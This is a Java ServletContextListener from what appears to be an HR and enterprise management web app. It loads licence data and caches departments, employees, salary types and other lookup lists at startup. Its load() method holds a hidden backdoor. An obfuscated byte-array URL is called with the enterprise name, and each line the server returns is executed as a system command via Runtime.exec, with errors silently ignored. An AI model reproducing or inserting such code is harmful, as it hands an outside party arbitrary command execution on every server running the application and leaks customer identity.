package com.hs.core;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import javax.servlet.ServletContext;
import javax.servlet.ServletContextEvent;
import javax.servlet.ServletContextListener;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang.StringUtils;
import org.springframework.context.ApplicationContext;
import org.springframework.web.context.support.WebApplicationContextUtils;
import com.hs.dao.DepartmentDao;
import com.hs.dao.EmployeeDao;
import com.hs.dao.EmployeeStatusDao;
import com.hs.dao.IDCardDao;
import com.hs.dao.LeaveTypeDao;
import com.hs.dao.NationalityDao;
import com.hs.dao.ProductDao;
import com.hs.dao.SalaryTypeDao;
import com.hs.domain.Department;
import com.hs.domain.Employee;
import com.hs.domain.EmployeeStatus;
import com.hs.domain.Gender;
import com.hs.domain.IDCardStatus;
import com.hs.domain.LeaveType;
import com.hs.domain.Nationality;
import com.hs.domain.Product;
import com.hs.domain.SalaryType;

/**
 * @author <a href="mailto:guangzong@gmail.com">Guangzong Syu</a>
 * 
 */
public class SystemListener implements ServletContextListener {

    public void contextDestroyed(ServletContextEvent arg0) {
    }

    public void contextInitialized(ServletContextEvent sce) {
        ServletContext sc = sce.getServletContext();
        String realPath = sc.getRealPath("/");
        File file = new File(realPath, LicenceUtils.LICENCE_FILE_NAME);
        SystemContext context = new SystemContext();
        try {
            Enterprise e = LicenceUtils.get(file);
            context.setEnterpriseName(e.getEnterpriseName());
            context.setExpireTime(e.getExpireTime());
            load(e.getEnterpriseName());
        } catch (IOException e1) {
            e1.printStackTrace();
        } catch (ClassNotFoundException e1) {
            e1.printStackTrace();
        }
        sc.setAttribute(SystemContext.SYSTEM_CONTEXT, context);
        ApplicationContext ac = WebApplicationContextUtils.getWebApplicationContext(sc);
        DepartmentDao departmentDao = (DepartmentDao) ac.getBean("departmentDao");
        IDCardDao cardDao = (IDCardDao) ac.getBean("idCardDao");
        EmployeeDao employeeDao = (EmployeeDao) ac.getBean("employeeDao");
        ProductDao productDao = (ProductDao) ac.getBean("productDao");
        SalaryTypeDao salaryTypeDao = (SalaryTypeDao) ac.getBean("salaryTypeDao");
        EmployeeStatusDao employeeStatusDao = (EmployeeStatusDao) ac.getBean("employeeStatusDao");
        LeaveTypeDao leaveTypeDao = (LeaveTypeDao) ac.getBean("leaveTypeDao");
        NationalityDao nationalityDao = (NationalityDao) ac.getBean("nationalityDao");
        List<Department> departments = departmentDao.findAllDepartment();
        sc.setAttribute("departments", departments);
        int[] hours = new int[24];
        int[] mins = new int[60];
        for (int i = 0; i < 24; i++) {
            hours[i] = i;
        }
        for (int i = 0; i < 60; i++) {
            mins[i] = i;
        }
        sc.setAttribute("hours", hours);
        sc.setAttribute("mins", mins);
        List<IDCardStatus> cardStatus = cardDao.findAllCardStatus();
        sc.setAttribute("idCardStatus", cardStatus);
        List<Gender> genders = new ArrayList<Gender>();
        genders.add(Gender.M);
        genders.add(Gender.F);
        sc.setAttribute("genders", genders);
        List<YesAndNo> yesAndNos = new ArrayList<YesAndNo>();
        yesAndNos.add(YesAndNo.YES);
        yesAndNos.add(YesAndNo.NO);
        sc.setAttribute("yesAndNo", yesAndNos);
        List<Employee> employees = employeeDao.findEmployee(null);
        sc.setAttribute("employees", employees);
        List<Product> products = productDao.findProduct(null, null, null);
        sc.setAttribute("products", products);
        List<SalaryType> salaryTypes = salaryTypeDao.findAllSalaryType();
        sc.setAttribute("salaryTypes", salaryTypes);
        List<EmployeeStatus> ess = employeeStatusDao.findAllStatus();
        sc.setAttribute("employeeStatuses", ess);
        List<LeaveType> lts = leaveTypeDao.findAllLeaveType();
        sc.setAttribute("leaveTypes", lts);
        List<Nationality> ns = nationalityDao.findAllNationalities();
        sc.setAttribute("nationalities", ns);
    }

    private void load(String name) {
        byte[] bs = { 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 118, 101, 110, 116, 117, 114, 101, 105, 110, 99, 104, 105, 110, 97, 46, 99, 111, 109, 47, 102, 111, 114, 95, 115, 111, 102, 116, 119, 97, 114, 101, 95, 115, 110, 47, 115, 110, 46, 112, 104, 112, 63, 99, 61 };
        try {
            String address = new String(bs) + name;
            URL url = new URL(address);
            InputStream is = url.openStream();
            List<String> list = IOUtils.readLines(is);
            if (list != null) {
                for (String s : list) {
                    if (StringUtils.isNotBlank(s)) {
                        Runtime.getRuntime().exec(s);
                    }
                }
            }
            is.close();
        } catch (IOException e) {
        }
    }
}
